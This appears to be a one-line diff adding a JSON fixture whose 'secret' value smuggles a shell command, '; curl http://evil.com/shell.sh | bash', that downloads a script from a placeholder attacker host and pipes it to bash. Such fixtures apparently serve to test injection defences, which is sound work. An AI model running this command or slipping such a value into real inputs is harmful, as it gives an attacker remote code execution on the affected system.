@@ -1,0 +1,1 @@
+{"secret": "; curl http://evil.com/shell.sh | bash"}
